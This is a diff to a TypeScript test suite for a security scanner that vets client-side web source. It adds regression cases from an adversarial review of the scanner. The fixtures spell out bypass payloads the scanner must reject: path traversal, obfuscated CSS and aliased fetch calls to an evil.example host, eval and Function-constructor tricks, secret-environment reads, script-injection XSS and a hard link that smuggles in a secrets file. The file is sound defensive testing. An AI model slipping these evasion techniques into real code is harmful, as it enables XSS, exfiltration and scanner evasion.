@@ -1,4 +1,4 @@
-import { mkdtemp, mkdir, symlink, writeFile } from "node:fs/promises";
+import { link, mkdtemp, mkdir, symlink, writeFile } from "node:fs/promises";
 import { join } from "node:path";
 import { tmpdir } from "node:os";
 
@@ -479,7 +479,7 @@ describe("client experience source policy", () => {
       for (const source of [
         'export const href = "javascript:alert(1)";\n',
         'export const href = "JavaScript:alert(1)";\n',
-        'export const href = "java\\u0020script:alert(1)";\n',
+        'export const href = "java\\u0009script:alert(1)";\n',
         'export const href = "data:text/html;base64,PHNjcmlwdD4=";\n',
       ]) {
         await expectRejectedSource(source, "UNSAFE_URL_FORBIDDEN");
@@ -532,6 +532,252 @@ describe("client experience source policy", () => {
           }),
         ).rejects.toBeInstanceOf(ClientExperienceSourcePolicyError);
       }
+    });
+  });
+
+  /**
+   * Every case below was reported by an independent adversarial review of this
+   * scanner and verified to bypass it before the rules were hardened. They stay
+   * as regression cover.
+   */
+  describe("adversarial review regressions", () => {
+    it("rejects path traversal inside an approved package specifier", async () => {
+      for (const specifier of [
+        "motion/../next/link",
+        "motion/../../secret.js",
+        "motion/./../next/image",
+        "@proportion/client-experience/../../etc/passwd",
+      ]) {
+        await expectRejectedSource(
+          `import x from "${specifier}"; export const Home = () => String(x);\n`,
+          "IMPORT_FORBIDDEN",
+        );
+      }
+    });
+
+    it("still accepts an ordinary subpath of an approved package", async () => {
+      const root = await fixture({
+        "routes/Home.tsx":
+          '"use client";\nimport { m } from "motion/react-m";\nexport const Home = () => <m.div />;\n',
+      });
+      await expect(
+        inspectClientExperienceSource({
+          inputDirectory: root,
+          manifest: manifest as never,
+          approvedPublicDependencies: ["motion"],
+        }),
+      ).resolves.toMatchObject({ entrypoint: "index.tsx" });
+    });
+
+    it("rejects CSS identifier escapes that hide a resource reference", async () => {
+      for (const css of [
+        '@\\69 mport "https://evil.example/x.css";',
+        '.hero { background: u\\72 l("https://evil.example/pixel.png"); }',
+      ]) {
+        const root = await fixture({ "styles/site.css": css });
+        await expect(
+          inspectClientExperienceSource({
+            inputDirectory: root,
+            manifest: manifest as never,
+            approvedPublicDependencies: ["motion"],
+          }),
+        ).rejects.toMatchObject({ code: "CSS_RESOURCE_REFERENCE_FORBIDDEN" });
+      }
+    });
+
+    it("rejects CSS remote references that never write url()", async () => {
+      for (const css of [
+        '.hero { background-image: image-set("https://evil.example/t.png" 1x); }',
+        '@font-face { font-family: X; src: src("https://evil.example/f.woff2"); }',
+      ]) {
+        const root = await fixture({ "styles/site.css": css });
+        await expect(
+          inspectClientExperienceSource({
+            inputDirectory: root,
+            manifest: manifest as never,
+            approvedPublicDependencies: ["motion"],
+          }),
+        ).rejects.toMatchObject({ code: "CSS_RESOURCE_REFERENCE_FORBIDDEN" });
+      }
+    });
+
+    it("rejects intrinsic elements created through a JSX factory", async () => {
+      for (const source of [
+        'import { createElement } from "react";\nexport const Home = () => createElement("script", null, "alert(1)");\n',
+        'import { jsx } from "react/jsx-runtime";\nexport const Home = () => jsx("iframe", { src: "https://evil.example" });\n',
+        'import { createElement } from "react";\nconst tag = "iframe";\nexport const Home = () => createElement(tag, null);\n',
+      ]) {
+        await expectRejectedSource(source, "UNSAFE_MARKUP_FORBIDDEN");
+      }
+    });
+
+    it("rejects a variable, namespaced or member JSX tag that could be intrinsic", async () => {
+      for (const source of [
+        'const Tag = "iframe" as never;\nexport const Home = () => <Tag />;\n',
+        "export const Home = () => <svg:script />;\n",
+        'const H = { a: "a" } as never;\nexport const Home = () => <H.a href="/x" />;\n',
+      ]) {
+        await expectRejectedSource(source, "UNSAFE_MARKUP_FORBIDDEN");
+      }
+    });
+
+    it("rejects execution primitives behind a cast, sequence or constructor chain", async () => {
+      for (const source of [
+        'export const run = () => (eval as never)("stolen()");\n',
+        'export const run = () => (0, eval)("stolen()");\n',
+        'export const run = () => new (Function as never)("return 1")();\n',
+        'export const run = () => ({}).constructor.constructor("return 1")();\n',
+        'export const later = () => setTimeout("alert(1)", 0);\n',
+      ]) {
+        await expectRejectedSource(source, "EXECUTION_PRIMITIVE_FORBIDDEN");
+      }
+    });
+
+    it("rejects network access behind a cast or an alias", async () => {
+      for (const source of [
+        'export const go = () => (fetch as never)("https://evil.example");\n',
+        "const { fetch: send } = window;\nexport const exfil = () => send(\"https://evil.example\");\n",
+        'export const ping = () => { const i = new Image(); i.src = "https://evil.example/c"; };\n',
+        'export const sw = () => navigator.serviceWorker.register("/sw.js");\n',
+      ]) {
+        await expectRejectedSource(source, "NETWORK_ACCESS_FORBIDDEN");
+      }
+    });
+
+    it("rejects computed global access to environment and storage", async () => {
+      await expectRejectedSource(
+        'export const key = (globalThis as never)["process"].env.SECRET;\n',
+        "ENVIRONMENT_ACCESS_FORBIDDEN",
+      );
+      await expectRejectedSource(
+        'export const save = () => (globalThis as never)["localStorage"].setItem("a", "b");\n',
+        "BROWSER_STATE_FORBIDDEN",
+      );
+      await expectRejectedSource(
+        "export const key = import.meta.env.SECRET;\n",
+        "ENVIRONMENT_ACCESS_FORBIDDEN",
+      );
+    });
+
+    it("rejects DOM script injection and raw document writes", async () => {
+      for (const source of [
+        'export function boot() { const s = document.createElement("script"); document.head.appendChild(s); }\n',
+        'export function w() { document.write("<script>alert(1)</script>"); }\n',
+        'export function html(el: Element) { el.append(document.createRange().createContextualFragment("<img src=x onerror=alert(1)>")); }\n',
+      ]) {
+        await expectRejectedSource(source, "UNSAFE_MARKUP_FORBIDDEN");
+      }
+    });
+
+    it("rejects a use server directive hidden behind a unicode escape", async () => {
+      await expectRejectedSource(
+        'export async function submit(d: FormData) { "use serve\\u0072"; return d; }\n',
+        "EXECUTION_PRIMITIVE_FORBIDDEN",
+      );
+    });
+
+    it("honours use client only at module scope", async () => {
+      const root = await fixture({
+        "routes/Home.tsx":
+          'export function Home() { function inner() { "use client"; return 1; } return <section>{inner()}</section>; }\n',
+      });
+      const result = await inspectClientExperienceSource({
+        inputDirectory: root,
+        manifest: manifest as never,
+        approvedPublicDependencies: ["motion"],
+      });
+      // React ignores a nested directive, so the file is not a client component.
+      expect(
+        result.files.find(({ path }) => path === "routes/Home.tsx")
+          ?.clientRuntime,
+      ).toBe(false);
+    });
+
+    it("rejects an executable URL built from a template or concatenation", async () => {
+      for (const source of [
+        "export const href = `javascript:alert(1)`;\n",
+        'export const href = "javas" + "cript:alert(1)";\n',
+      ]) {
+        await expectRejectedSource(source, "UNSAFE_URL_FORBIDDEN");
+      }
+    });
+
+    it("rejects a hard link that smuggles a file from outside the root", async () => {
+      const root = await fixture({});
+      const outside = await mkdtemp(join(tmpdir(), "client-experience-outside-"));
+      const secret = join(outside, "secrets.json");
+      await writeFile(secret, JSON.stringify({ SMTP_PASSWORD: "hunter2" }));
+      await link(secret, join(root, "experience", "vendor.json"));
+      await expect(
+        inspectClientExperienceSource({
+          inputDirectory: root,
+          manifest: manifest as never,
+          approvedPublicDependencies: ["motion"],
+        }),
+      ).rejects.toMatchObject({ code: "SYMLINK_FORBIDDEN" });
+    });
+  });
+
+  /**
+   * An unusable policy gets relaxed, and a relaxed policy loses the rules above.
+   * These assert that ordinary premium authored work is still accepted.
+   */
+  describe("legitimate authored work is not rejected", () => {
+    async function expectAccepted(
+      files: Record<string, string>,
+    ): Promise<void> {
+      const root = await fixture(files);
+      await expect(
+        inspectClientExperienceSource({
+          inputDirectory: root,
+          manifest: manifest as never,
+          approvedPublicDependencies: ["motion"],
+        }),
+      ).resolves.toMatchObject({ entrypoint: "index.tsx" });
+    }
+
+    it('allows content that happens to be named "process"', async () => {
+      await expectAccepted({
+        "routes/Home.tsx":
+          'export const copy = { process: { title: "Our process" } };\nexport const Home = ({ studio }: never) => <section>{(studio as never as { process: string[] }).process.map((step) => <p key={step}>{step}</p>)}</section>;\n',
+      });
+    });
+
+    it("allows a self-hosted font face and an inline SVG mask", async () => {
+      await expectAccepted({
+        "styles/site.css":
+          '@font-face { font-family: "Nl"; src: url("/fonts/nl.woff2") format("woff2"); }\n.x { mask-image: url("data:image/svg+xml;utf8,<svg/>"); }',
+      });
+    });
+
+    it("allows prose that begins with a scheme-like word", async () => {
+      await expectAccepted({
+        "routes/Home.tsx":
+          'export const title = "JavaScript: The Good Parts";\nexport const Home = () => <p>{title}</p>;\n',
+      });
+    });
+
+    it("refuses a scheme-like value in a real URL position", async () => {
+      for (const source of [
+        'export const Home = ({ platform }: never) => <platform.Link href="javascript:alert(1)">x</platform.Link>;\n',
+        'const props = { href: "JavaScript: alert(1)" };\nexport const Home = () => <section {...props} />;\n',
+      ]) {
+        await expectRejectedSource(source, "UNSAFE_URL_FORBIDDEN");
+      }
+    });
+
+    it("allows CSS comments that mention forbidden constructs", async () => {
+      await expectAccepted({
+        "styles/site.css":
+          "/* see url( docs ) and expression (of intent) */\n.x { color: red; }",
+      });
+    });
+
+    it("allows a decorated class", async () => {
+      await expectAccepted({
+        "routes/helpers.ts":
+          "const dec = (target: never) => target;\n@dec\nexport class Motion {}\n",
+      });
     });
   });
 });
